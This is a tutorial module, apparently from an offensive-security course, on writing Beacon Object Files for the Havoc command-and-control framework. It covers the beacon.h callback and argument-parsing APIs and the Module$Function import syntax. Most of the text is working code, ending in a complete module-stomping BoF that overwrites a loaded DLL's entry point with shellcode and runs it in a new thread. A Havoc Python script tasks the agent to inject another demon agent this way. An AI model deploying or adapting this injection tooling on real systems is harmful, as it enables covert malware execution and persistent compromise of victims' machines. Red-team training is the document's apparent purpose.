Module 50 - Writing Beacon Object Files

Writing Beacon Object Files

Introduction

Beacon Object Files or BoFs provide an alternative method for executing custom code via our C&C agent, bypassing the traditional "fork & run" approachwhere a sacrificial process is spawned, a DLL module is injected into it, and its output is awaited. Compared to this conventional method, BoFs are smaller, simpler to write, and easier to load, as they require fewer steps and less code to parse and process the file in memory for execution.

This module will show how to write BoFs, explore the Beacon API, and parse arguments.

Beacon.h Header File

To begin creating a Beacon Object File, it is essential to first download the beacon.h header file. This file contains common Beacon APIs, which allow interactions with the agents internal API for tasks such as callbacks, token manipulation, and process injection. In this module, we will primarily utilize the callback API to relay output back to the agent console.

BeaconPrintF - Sending Message To C&C Console

We'll start by demonstrating the usage of a beacon function, BeaconPrintf, that's defined within beacon.h. BeaconPrintf is a simple function that's used to send messages to our agent console. The example code below demonstrates how to send the message "Hello from Beacon Object File" back to the C&C agent console using BeaconPrintf.

#include <windows.h>
#include "beacon.h"

void go(char* args, int argc) {
    BeaconPrintf(CALLBACK_OUTPUT, "Hello from Beacon Object File: %s [%d bytes]", args, argc);
}

The code snippet above imports the windows.h header, which is a requirement for beacon.h to function correctly. The beacon.h header utilizes DECLSPEC_IMPORT to declare the Beacon API types as imports, which the agent then processes. Additionally, the snippet uses the standard entry point for a Beacon Object File, named go. This function copies the conventional main function in that it accepts a character array pointer (i.e. char* args) and the length of the array as its arguments (i.e. int argc).


BeaconPrintf Arguments

BeaconPrintf requires at least two arguments: the first is the type of callback, which can be one of the following:

  • CALLBACK_OUTPUT - A generic output.

  • CALLBACK_ERROR - A generic error message.

Although there are other types available, they are less commonly used and will not be covered here. The second argument is a format string, similar to printf, into which additional arguments are formatted.

After drafting this basic object file source code, we will use w64-mingw to compile it into a single object file, which the Havoc framework will then execute. This process will produce a binary file named bof.o that the Havoc daemon agent can parse and invoke.

$ ls 
beacon.h  bof.c

$ x86_64-w64-mingw32-gcc -c bof.c -o bof.o

$ ls 
beacon.h  bof.c  bof.o

The Visual Studio compiler can also be used to compile object files using the following command:

cl.exe /c /GS- bof.c /Fo:"bof.o"

Executing BoF Via Inline-Execute

After successfully compiling the object file, it can be used within the Havoc framework to task the agent with its execution. To execute BoFs, the inline-execute command is used.

To invoke the object file using this command, the first argument should be the full path to the BoF. The optional second argument consists of the parameters to be passed to the object file upon execution.


Parsing Arguments Via BoF APIs

Many BoFs use packed arguments, which are parsed on the agent side. This method simplifies data retrieval without the need for string conversion and helps minimize the data sent and received. The agent provides the following APIs to parse arguments from a packed buffer:

  • void BeaconDataParse(datap* parser, char* buffer, int size) - Prepares a data parser to extract arguments from the specified buffer and size.

  • char* BeaconDataExtract(datap* parser, int* size) - Extracts and returns a length-prefixed binary blob. The size argument can be NULL. However, if the size argument was provided, it will be populated with the number of bytes extracted.

  • int BeaconDataInt(datap* parser) - Extracts and returns a 32-bit integer from the specified parser struct.

  • short BeaconDataShort(datap* parser) - Extracts and returns a 16-bit integer from the specified parser struct.

With these APIs in mind, we can now demonstrate how to use them in our BoF to retrieve and parse arguments. The following piece of code illustrates this process:

#include <windows.h>
#include "beacon.h"

void go(char* args, int argc) {
    datap Parser = { 0 };
    PSTR  String = { 0 };
    DWORD Length = { 0 };
    DWORD Int32  = { 0 };

    /* Initialize the argument buffer for parsing */
    BeaconDataParse(&Parser, args, argc);

    /* Extract arguments */
    String = BeaconDataExtract(&Parser, &Length);
    Int32  = BeaconDataInt(&Parser); 

    /* Output the parsed arguments to the operator's agent console */
    BeaconPrintf(
        CALLBACK_OUTPUT, 
        "Parsed Arguments: \n"
        " - String: %s [%d bytes]\n"
        " - Int32 : %d\n",
        String, Length, Int32
    );
}

The code above starts by using BeaconDataParse to set up the args buffer and argc length for parsing, creating a parser object called Parser of type datap. This Parser object is then used to extract arguments:

  • BeaconDataExtract gets a string from the buffer.

  • BeaconDataInt retrieves a 32-bit integer from the buffer.

After parsing, the extracted arguments are displayed on the agent console, showing that the packed arguments have been successfully parsed and handled.

Packaging Arguments with a Havoc Python Module

With the object file prepared for compilation and execution, we need to manage the argument packaging manually. This can be achieved by providing the following Python script to the Havoc client:

from havoc import Demon, RegisterCommand, RegisterModule
from os.path import exists

class Packer:
    def __init__(self):
        self.buffer: bytes = b''
        self.size: int = 0

    def getbuffer(self):
        return pack("<L", self.size) + self.buffer

    def addstr(self, s):
        if s is None:
            s = ''
        if isinstance(s, str):
            s = s.encode("utf-8")
        fmt = "<L{}s".format(len(s) + 1)
        self.buffer += pack(fmt, len(s) + 1, s)
        self.size += calcsize(fmt)

    def addint(self, dint):
        self.buffer += pack("<i", dint)
        self.size += 4

def bof(demon_id, *args):
    
    task_id: str = None
    demon: Demon = None
    packer: Packer = Packer()
    string: str = None
    int32: int = 0

    # Get the agent instance based on demon ID
    demon = Demon(demon_id)

    # Check if enough arguments have been specified
    if len(args) < 2:
        demon.ConsoleWrite(demon.CONSOLE_ERROR, "Not enough arguments")
        return False

    # Get passed arguments
    string = args[0]
    int32 = int(args[1])

    # Add the arguments to the packer
    packer.addstr(string)
    packer.addint(int32)

    task_id = demon.ConsoleWrite(demon.CONSOLE_TASK, "Tasked the demon to execute the example bof")

    # Task the agent to execute the bof with the entry point being "go" 
    # and the arguments being the packed arguments buffer
    demon.InlineExecute(task_id, "go", "/tmp/bof.o", packer.getbuffer(), False)

    return task_id

# Register the Python function as a command to the Havoc client
RegisterCommand(bof, "", "bof", "Example bof command", 0, "[string] [32-bit integer]", "5pider-was-here 5555")

Calling Win32 API in BoFs

Beacon object files are designed to interact with operating system functions and APIs exported by libraries to perform post-exploitation tasks or other significant operations. Since object files do not contain an import address table that tells the loader what functions to load from which libraries, we can store that information in the calling API using a specific format: Module$Function. This format separates the module where the function is stored and the function name to call with a dollar sign $.

The object file loader from the Havoc Demon agent (and other C2 frameworks) parses the symbol and resolves the module and function. External functions and APIs need to be prefixed and declared as imported functions using the DECLSPEC_IMPORT macro, which resolves to __declspec(dllimport) and prefixes the symbol with an __imp_ string that helps the object loader recognize it as an imported function.

For example, let's use the GetUserNameA API. According to the official Microsoft API documentation, it is exported by the advapi32 module. Heres how to apply the external function format to it so the BoF can call it:

DECLSPEC_IMPORT BOOL ADVAPI32$GetUserNameA(
  LPSTR   lpBuffer,
  LPDWORD pcbBuffer
);

As shown above, the function name is prefixed with the module name and separated by a dollar sign $. The DECLSPEC_IMPORT is defined before the return type, allowing the object loader to treat the function as an imported function that needs resolution.

Example: Getting the Current Username

Let's write a practical BoF that utilizes the Win32 API to get the current username of the running host.

#include <windows.h>
#include "beacon.h"

DECLSPEC_IMPORT BOOL ADVAPI32$GetUserNameA(LPSTR lpBuffer, LPDWORD pcbBuffer);
DECLSPEC_IMPORT DWORD KERNEL32$GetLastError();

void go(char* args, int argc) {
    CHAR  User[MAX_PATH + 1] = { 0 };
    DWORD Size               = MAX_PATH;

    if (!ADVAPI32$GetUserNameA(User, &Size)) {
        BeaconPrintf(CALLBACK_ERROR, "[!] GetUserNameA Failed with Error: %ld", KERNEL32$GetLastError());
        return;
    }

    BeaconPrintf(CALLBACK_OUTPUT, "Username: %s", User);
}

The above beacon object file imports two APIs: GetUserNameA from advapi32 and GetLastError from kernel32, both specified as imported functions using DECLSPEC_IMPORT.

In the BoF code, GetUserNameA is called with the module name included. If it fails, GetLastError is called to retrieve the error, and an error message is sent back to the operator agent console. If everything executes without errors, the username is sent back to the agent console.


Converting Module Stomping To A BoF

With the foundational concepts covered, we can now write a simple beacon object file that performs module stomping in the current process and injects another demon agent into the stomped memory region. Module stomping is discussed in detail in the Module Stomping module, which is recommended reading before proceeding with this example.

BOOL LoadDllFile(IN LPCWSTR szDllFilePath, OUT HMODULE* phModule, OUT PULONG_PTR puEntryPnt) {

    HANDLE              hFile               = INVALID_HANDLE_VALUE,
                        hSection            = NULL;
    NTSTATUS            STATUS              = STATUS_SUCCESS;
    ULONG_PTR           uMappedModule       = NULL;
    SIZE_T              sViewSize           = NULL;
    PIMAGE_NT_HEADERS   pImgNtHdrs          = NULL;

    if (!szDllFilePath || !phModule || !puEntryPnt)
        return FALSE;

    if ((hFile = KERNEL32$CreateFileW(szDllFilePath, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL)) == INVALID_HANDLE_VALUE) {
        PRNT_WN_ERR("CreateFileW");
        goto _FUNC_CLEANUP;
    }

    if (!NT_SUCCESS((STATUS = NTDLL$NtCreateSection(&hSection, SECTION_ALL_ACCESS, NULL, 0x00, PAGE_READONLY, SEC_IMAGE, hFile)))) {
        PRNT_NT_ERR("NtCreateSection", STATUS);
        goto _FUNC_CLEANUP;
    }
  
    DELETE_HANDLE(hFile);

    if (!NT_SUCCESS((STATUS = NTDLL$NtMapViewOfSection(hSection, NtCurrentProcess(), &uMappedModule, NULL, NULL, NULL, &sViewSize, ViewShare, NULL, PAGE_EXECUTE_READWRITE)))) {
        PRNT_NT_ERR("NtMapViewOfSection", STATUS);
        goto _FUNC_CLEANUP;
    }

    pImgNtHdrs = (PIMAGE_NT_HEADERS)(uMappedModule + ((PIMAGE_DOS_HEADER)uMappedModule)->e_lfanew);
    if (pImgNtHdrs->Signature != IMAGE_NT_SIGNATURE)
        goto _FUNC_CLEANUP;

    *phModule           = (HMODULE)uMappedModule;
    *puEntryPnt         = uMappedModule + pImgNtHdrs->OptionalHeader.AddressOfEntryPoint;

_FUNC_CLEANUP:
    DELETE_HANDLE(hFile);
    DELETE_HANDLE(hSection);
    return (*phModule && *puEntryPnt) ? TRUE : FALSE;
}

BOOL VerifyInjection(IN ULONG_PTR uSacrificialModule, IN ULONG_PTR uEntryPoint, IN SIZE_T sPayloadSize) {

    PIMAGE_NT_HEADERS       pImgNtHdrs      = NULL;
    PIMAGE_SECTION_HEADER   pImgSecHdr      = NULL;
    ULONG_PTR               uTextAddress    = NULL;
    SIZE_T                  sTextSize       = NULL,
                            sTextSizeLeft   = NULL;

    pImgNtHdrs = (PIMAGE_NT_HEADERS)(uSacrificialModule + ((PIMAGE_DOS_HEADER)uSacrificialModule)->e_lfanew);
    if (pImgNtHdrs->Signature != IMAGE_NT_SIGNATURE)
        return FALSE;

    pImgSecHdr = IMAGE_FIRST_SECTION(pImgNtHdrs);
    
    for (int i = 0; i < pImgNtHdrs->FileHeader.NumberOfSections; i++) {
        if ((*(ULONG*)pImgSecHdr[i].Name | 0x20202020) == 'xet.') {
            uTextAddress    = uSacrificialModule + pImgSecHdr[i].VirtualAddress;
            sTextSize       = pImgSecHdr[i].Misc.VirtualSize;
            break;
        }
    }

    if (!uTextAddress || !sTextSize)
        return FALSE;

/*
         -----------    *uTextAddress*
        |           |
        |     Y     |   >>> Y = uEntryPoint - uTextAddress
        |           |
         -----------    *uEntryPoint*
        |           |
        |           |
        |     X     |   >>> X = sTextSize - Y  
        |           |
        |           |
         -----------    *uTextAddress + sTextSize*
*/

    // Calculate the size between the entry point and the end of the text section.

    sTextSizeLeft = sTextSize - (uEntryPoint - uTextAddress);

    BeaconPrintf(CALLBACK_OUTPUT, "[i] Payload Size: %d Byte\n", sPayloadSize);
    BeaconPrintf(CALLBACK_OUTPUT, "[i] Available Memory (Starting From The EP): %d Byte\n", sTextSizeLeft);

    // Check if the shellcode can fit
    if (sTextSizeLeft >= sPayloadSize)
        return TRUE;

    return FALSE;
}

BOOL ShellcodeModuleStomp(IN LPCWSTR szSacrificialDll, IN PBYTE pBuffer, IN SIZE_T sBufferSize) {

    NTSTATUS    STATUS                  = STATUS_SUCCESS;
    HMODULE     hSacrificialModule      = NULL;
    ULONG_PTR   uEntryPoint             = NULL;
    HANDLE      hThread                 = NULL;
    DWORD       dwOldProtection         = 0x00;

    if (!szSacrificialDll || !pBuffer || !sBufferSize) {
        BeaconPrintf(CALLBACK_ERROR, "ShellcodeModuleStomp invalid args: [szSacrificialDll: %ls] [pBuffer: %p] [sBufferSize: %d]", szSacrificialDll, pBuffer, sBufferSize);
        return FALSE;
    }

    if (!LoadDllFile(szSacrificialDll, &hSacrificialModule, &uEntryPoint)) {
        BeaconPrintf(CALLBACK_ERROR, "LoadDllFile Failed");
        return FALSE;
    }
  
    BeaconPrintf(CALLBACK_OUTPUT, "[*] %ws Loaded Successfully At: 0x%p \n", szSacrificialDll, (PVOID)hSacrificialModule);
    BeaconPrintf(CALLBACK_OUTPUT, "[i] Entry Point: 0x%p \n", (PVOID)uEntryPoint);
  
    if (!VerifyInjection((ULONG_PTR)hSacrificialModule, uEntryPoint, sBufferSize))
        return FALSE;
        
    if (!KERNEL32$VirtualProtect(uEntryPoint, sBufferSize, PAGE_READWRITE, &dwOldProtection)) {
        PRNT_WN_ERR("VirtualProtect");
        return FALSE;
    }

    MemCopy(uEntryPoint, pBuffer, sBufferSize);
  
    /* NOTE: YOUR PAYLOAD MAY REQUIRE RWX PERMISSIONS*/
    // dwOldProtection's VALUE IS RX    
    if (!KERNEL32$VirtualProtect(uEntryPoint, sBufferSize, dwOldProtection, &dwOldProtection)) {
        PRNT_WN_ERR("VirtualProtect");
        return FALSE;
    }

    if (!NT_SUCCESS(STATUS = NTDLL$NtCreateThreadEx(&hThread, THREAD_ALL_ACCESS, NULL, NtCurrentProcess(), uEntryPoint, NULL, FALSE, 0x00, 0x00, 0x00, NULL))) {
        PRNT_NT_ERR("NtCreateThreadEx", STATUS);
        return FALSE;
    }

	KERNEL32$CloseHandle(hThread);

	return TRUE;
}

Converting Module Stomping To a BoF

The original module stomping code has been successfully ported to a BoF by using the BoF syntax for imports, where the library and function are separated by a dollar sign $. Additionally, all printf calls have been replaced with BeaconPrintf to ensure that logs are sent to the operator agent console. Memory utility functions like memcpy and memset have been replaced with compiler intrinsics such as __movsb for copying memory and __stosb as a replacement for memset.

Now that the BoF is complete, let's review the script that will be loaded by the Havoc client to process the arguments and issue the inline-execute task.

from havoc import Demon, RegisterCommand, RegisterModule
from os.path import exists
from struct import pack, calcsize

class Packer:
    def __init__(self):
        self.buffer: bytes = b''
        self.size: int = 0

    def getbuffer(self):
        return pack("<L", self.size) + self.buffer

    def addbytes(self, b):
        if b is None:
            b = b''
        fmt = "<L{}s".format(len(b))
        self.buffer += pack(fmt, len(b), b)
        self.size += calcsize(fmt)

    def addstr(self, s):
        if s is None:
            s = ''
        if isinstance(s, str):
            s = s.encode("utf-8")
        fmt = "<L{}s".format(len(s) + 1)
        self.buffer += pack(fmt, len(s) + 1, s)
        self.size += calcsize(fmt)

    def addint(self, dint):
        self.buffer += pack("<i", dint)
        self.size += 4

def module_stomp(demon_id, *args):
    
    task_id: str = None
    demon: Demon = None
    packer: Packer = Packer()
    binary: bytes = None

    # Get the agent instance based on demon ID
    demon = Demon(demon_id)

    # Check if enough arguments have been specified
    if len(args) < 1:
        demon.ConsoleWrite(demon.CONSOLE_ERROR, "Not enough arguments")
        return False

    # Get shellcode path
    path = args[0]

    # Check if the shellcode path exists
    if not exists(path):
        demon.ConsoleWrite(demon.CONSOLE_ERROR, f"Shellcode not found: {path}")
        return False

    # Read the shellcode from the specified path into 'binary' variable
    with open(path, 'rb') as handle:
        binary = handle.read()

    if not binary:
        demon.ConsoleWrite(demon.CONSOLE_ERROR, "Specified shellcode is empty")
        return False

    # Add the arguments to the packer
    packer.addbytes(binary)

    task_id = demon.ConsoleWrite(demon.CONSOLE_TASK, f"Tasked the demon to execute module-stomp BoF [binary length: {len(binary)} bytes]")

    # Task the agent to execute the BoF with the entry point being "go" 
    # and the arguments being the packed arguments buffer
    demon.InlineExecute(task_id, "go", f"/tmp/module-stomp.o", packer.getbuffer(), False)

    return task_id

RegisterCommand(module_stomp, "", "module-stomp", "Module stomp BoF to execute shellcode", 0, "[shellcode path]", "/tmp/demon.x64.bin")

This script processes the specified path argument, checks if the file exists and is not empty, packs the binary buffer into the Packer object and invokes the InlineExecute method to instruct the agent to load and execute the object file.
